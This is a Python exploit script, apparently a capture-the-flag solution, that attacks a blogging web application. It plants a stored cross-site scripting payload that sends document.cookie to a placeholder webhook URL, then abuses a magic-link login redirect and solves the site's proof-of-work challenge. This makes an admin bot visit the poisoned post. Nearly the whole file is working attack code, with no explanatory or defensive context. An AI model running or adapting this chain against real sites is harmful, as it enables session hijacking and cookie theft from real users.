import base64
import random
import re
import string
from urllib.parse import urlencode

import requests


def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def parse_token(account_html):
    matches = re.findall(r"/magic/([a-f0-9]{32})", account_html)
    return matches[-1] if matches else None


def parse_pow_challenge(report_html):
    match = re.search(r'name="pow_challenge" value="([^"]+)"', report_html)
    return match.group(1) if match else None


POW_VERSION = 's'
POW_MOD = (1 << 1279) - 1
POW_EXP = 1 << 1277


def decode_pow_challenge(challenge):
    parts = challenge.split('.', 2)
    if len(parts) != 3 or parts[0] != POW_VERSION:
        raise ValueError('invalid pow challenge')
    d_bytes = base64.b64decode(parts[1])
    if len(d_bytes) > 4:
        raise ValueError('pow difficulty too long')
    d_bytes = b'\x00' * (4 - len(d_bytes)) + d_bytes
    difficulty = int.from_bytes(d_bytes, 'big')
    x_bytes = base64.b64decode(parts[2])
    x = int.from_bytes(x_bytes, 'big')
    return difficulty, x


def encode_pow_solution(value):
    if value:
        raw = value.to_bytes((value.bit_length() + 7) // 8, 'big')
    else:
        raw = b''
    return f'{POW_VERSION}.{base64.b64encode(raw).decode()}'


def solve_pow(challenge):
    difficulty, value = decode_pow_challenge(challenge)
    for _ in range(difficulty):
        value = pow(value, POW_EXP, POW_MOD)
        value ^= 1
    return encode_pow_solution(value)


def build_payload(exfil_url):
    return (
        "<script>fetch('"
        + exfil_url +
        "?c='+encodeURIComponent(document.cookie))</script>"
    )


def main():
    base_url = 'BASE_URL'
    exfil_url = 'WEBHOOK_URL'

    session = requests.Session()

    username = f'user_{random_string(6)}'
    password = f'pass_{random_string(8)}'

    session.post(
        f'{base_url}/register',
        data={'username': username, 'password': password},
        timeout=60
    )

    login_resp = session.post(
        f'{base_url}/login',
        data={'username': username, 'password': password},
        timeout=60
    )
    if login_resp.status_code >= 400:
        raise SystemExit('login failed')

    create_resp = session.get(f'{base_url}/edit', allow_redirects=False, timeout=60)
    if create_resp.status_code not in (301, 302, 303):
        raise SystemExit('failed to create post')

    location = create_resp.headers.get('Location', '')
    match = re.search(r'/edit/(\d+)', location)
    if not match:
        raise SystemExit('failed to parse post id')
    post_id = int(match.group(1))

    payload = build_payload(exfil_url)
    session.post(
        f'{base_url}/api/autosave',
        json={'postId': post_id, 'content': payload},
        timeout=60
    )

    session.post(f'{base_url}/magic/generate', timeout=60)
    account_resp = session.get(f'{base_url}/account', timeout=60)
    token = parse_token(account_resp.text)
    if not token:
        raise SystemExit('failed to find magic link')

    redirect = f'/edit/{post_id}'
    target = f'http://localhost:3000/magic/{token}?{urlencode({"redirect": redirect})}'
    report_page = session.get(f'{base_url}/report', timeout=60)
    pow_challenge = parse_pow_challenge(report_page.text)
    report_data = {'url': target}
    if pow_challenge:
        report_data['pow_challenge'] = pow_challenge
        report_data['pow_solution'] = solve_pow(pow_challenge)
    session.post(
        f'{base_url}/report',
        data=report_data,
        timeout=60
    )
    print(f'report sent to {exfil_url}')


if __name__ == '__main__':
    main()
